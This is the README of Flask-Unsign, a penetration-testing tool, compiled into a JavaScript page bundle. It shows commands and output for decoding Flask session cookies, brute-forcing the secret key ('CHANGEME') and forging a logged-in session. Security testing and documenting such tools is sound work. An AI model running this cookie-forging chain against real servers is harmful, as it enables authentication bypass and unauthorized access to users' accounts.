(window.webpackJsonp=window.webpackJsonp||[]).push([[484],{2322:function(e,s,t){"use strict";t.r(s);var n=t(75),a=Object(n.a)({},(function(){var e=this,s=e.$createElement,t=e._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"flask-unsign"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#flask-unsign"}},[e._v("#")]),e._v(" Flask Unsign")]),e._v(" "),t("p",[t("a",{attrs:{href:"https://travis-ci.com/Paradoxis/Flask-Unsign",target:"_blank",rel:"noopener noreferrer"}},[t("img",{attrs:{src:"https://travis-ci.com/Paradoxis/Flask-Unsign.svg?branch=master",alt:"Build Status"}}),t("OutboundLink")],1),e._v(" "),t("a",{attrs:{href:"https://badge.fury.io/py/flask-unsign",target:"_blank",rel:"noopener noreferrer"}},[t("img",{attrs:{src:"https://badge.fury.io/py/flask-unsign.svg",alt:"PyPI version"}}),t("OutboundLink")],1),e._v(" "),t("a",{attrs:{href:"https://codecov.io/gh/Paradoxis/Flask-Unsign",target:"_blank",rel:"noopener noreferrer"}},[t("img",{attrs:{src:"https://codecov.io/gh/Paradoxis/Flask-Unsign/branch/master/graph/badge.svg",alt:"codecov"}}),t("OutboundLink")],1)]),e._v(" "),t("p",[e._v("Command line tool to fetch, decode, brute-force and craft session cookies of a Flask  application by guessing secret keys.\nFor the standalone wordlist component, please visit the "),t("a",{attrs:{href:"https://github.com/Paradoxis/Flask-Unsign-Wordlist",target:"_blank",rel:"noopener noreferrer"}},[e._v("flask-unsign-wordlist"),t("OutboundLink")],1),e._v(" repository.")]),e._v(" "),t("h2",{attrs:{id:"requirements"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#requirements"}},[e._v("#")]),e._v(" Requirements")]),e._v(" "),t("ul",[t("li",[e._v("Python 3.6+")])]),e._v(" "),t("h2",{attrs:{id:"installation"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#installation"}},[e._v("#")]),e._v(" Installation")]),e._v(" "),t("p",[e._v("To install the application, simply use pip:")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ pip3 install flask-unsign[wordlist]\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("If you only want to install the core code, omit the "),t("code",[e._v("[wordlist]")]),e._v(" suffix:")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ pip3 install flask-unsign\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("To install the tool for development purposes, run the following command (after downloading a copy):")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ pip3 install -e .[test]\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"usage"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#usage"}},[e._v("#")]),e._v(" Usage")]),e._v(" "),t("p",[e._v("To get an overview of all possible options, simply call flask-unsign without\nany arguments like so:")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ flask-unsign\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h3",{attrs:{id:"obtaining-decoding-session-cookies"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#obtaining-decoding-session-cookies"}},[e._v("#")]),e._v(" Obtaining & Decoding Session Cookies")]),e._v(" "),t("p",[e._v("Due to the fact that Flask cookies are "),t("strong",[e._v("signed")]),e._v(" and "),t("strong",[e._v("not encrypted")]),e._v(", it's\npossible to locally decode the session data. For this, you can use the "),t("code",[e._v("--decode")]),e._v("\nargument.")]),e._v(" "),t("p",[e._v("Session cookies can be obtained by inspecting your HTTP requests using a proxy\nlike  Burp Proxy, using your browser's network inspector or using a browser\nextension to view/change your cookies. By default, Flask uses the session name\n"),t("code",[e._v('"session"')]),e._v(".")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'\n{'logged_in': False}\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br")])]),t("p",[e._v("You can also use Flask-Unsign's automatic session grabbing functionality by\npassing the "),t("code",[e._v("--server")]),e._v(" argument, instead of the "),t("code",[e._v("--cookie")]),e._v(" argument. "),t("em",[e._v("Do note\nhowever, "),t("strong",[e._v("that not all web pages might return a session")]),e._v(", so be sure to pass an\nurl which does.")])]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ flask-unsign --decode --server 'https://www.example.com/login'\n[*] Server returned HTTP 302 (FOUND)\n[+] Successfully obtained session cookie: eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8\n{'logged_in': False}\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br"),t("span",{staticClass:"line-number"},[e._v("3")]),t("br"),t("span",{staticClass:"line-number"},[e._v("4")]),t("br")])]),t("h3",{attrs:{id:"unsigning-brute-forcing-secret-keys"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#unsigning-brute-forcing-secret-keys"}},[e._v("#")]),e._v(" Unsigning (Brute Forcing Secret Keys)")]),e._v(" "),t("p",[e._v("After obtaining a sample session cookie, you'll be able to attempt to brute-force\nthe server's secret key. If you're lucky, this might be set to something easy to\nguess, or if it's been found online, it might be in one of your wordlists. For\nthis, you can use the "),t("code",[e._v("--unsign")]),e._v(" argument.")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ flask-unsign --unsign --cookie < cookie.txt\n[*] Session decodes to: {'logged_in': False}\n[*] No wordlist selected, falling back to default wordlist..\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 351 attempts\n'CHANGEME'\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br"),t("span",{staticClass:"line-number"},[e._v("3")]),t("br"),t("span",{staticClass:"line-number"},[e._v("4")]),t("br"),t("span",{staticClass:"line-number"},[e._v("5")]),t("br"),t("span",{staticClass:"line-number"},[e._v("6")]),t("br")])]),t("h3",{attrs:{id:"signing-session-manipulation"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#signing-session-manipulation"}},[e._v("#")]),e._v(" Signing (Session Manipulation)")]),e._v(" "),t("p",[e._v("Once you've obtained the server's secret key, you'll be able to craft your own\ncustom session data. For this, you can use the "),t("code",[e._v("--sign")]),e._v(" argument.")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("$ flask-unsign --sign --cookie \"{'logged_in': True}\" --secret 'CHANGEME'\neyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br")])]),t("h2",{attrs:{id:"troubleshooting"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#troubleshooting"}},[e._v("#")]),e._v(" Troubleshooting")]),e._v(" "),t("ul",[t("li",[t("strong",[e._v("Installing the program results in an error")]),e._v(" "),t("ul",[t("li",[e._v("You might be using the wrong "),t("code",[e._v("pip")]),e._v(" binary, try using\nthe following command: "),t("code",[e._v("python3.6 -m pip install flask-unsign")])])])]),e._v(" "),t("li",[t("strong",[e._v("I found a secret key, but my crafted sessions don't work!")]),e._v(" "),t("ul",[t("li",[e._v("It might be possible that your target server uses an older version of\n"),t("a",{attrs:{href:"https://github.com/pallets/itsdangerous",target:"_blank",rel:"noopener noreferrer"}},[e._v("itsdangerous"),t("OutboundLink")],1),e._v(". Due to\n"),t("a",{attrs:{href:"https://github.com/pallets/itsdangerous/issues/46",target:"_blank",rel:"noopener noreferrer"}},[e._v("an issue"),t("OutboundLink")],1),e._v(" with timed\nsessions, the timestamp generation algorithm was changed.\nTo generate an older signature, try using the "),t("code",[e._v("--legacy")]),e._v(" option.")])])]),e._v(" "),t("li",[t("strong",[e._v("My wordlist doesn't work")]),e._v(" "),t("ul",[t("li",[e._v("Wordlists expect to be newline delimited\n"),t("a",{attrs:{href:"https://docs.python.org/3/library/stdtypes.html#str",target:"_blank",rel:"noopener noreferrer"}},[e._v("python strings"),t("OutboundLink")],1),e._v("\n(meaning you need to encapsulate them in quotes), this is so that\nbinary strings can easily be stored in a newline format. If you don't want\nthis, you can disable this feature by passing the "),t("code",[e._v("--no-literal-eval")]),e._v("\nargument.")])])])]),e._v(" "),t("h2",{attrs:{id:"how-it-works"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#how-it-works"}},[e._v("#")]),e._v(" How it works")]),e._v(" "),t("p",[e._v("If you're wondering how exactly this works, refer to my\n"),t("a",{attrs:{href:"https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce",target:"_blank",rel:"noopener noreferrer"}},[e._v("blog post"),t("OutboundLink")],1),e._v("\nwhich explains this in great detail, including a guide on how to protect your own server from this attack.")]),e._v(" "),t("h2",{attrs:{id:"license"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#license"}},[e._v("#")]),e._v(" License")]),e._v(" "),t("p",[e._v("MIT License")]),e._v(" "),t("p",[e._v("Copyright (c) 2021 Luke Paris (Paradoxis)")]),e._v(" "),t("p",[e._v('Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the "Software"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:')]),e._v(" "),t("p",[e._v("The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.")]),e._v(" "),t("p",[e._v('THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.')])])}),[],!1,null,null,null);s.default=a.exports}}]);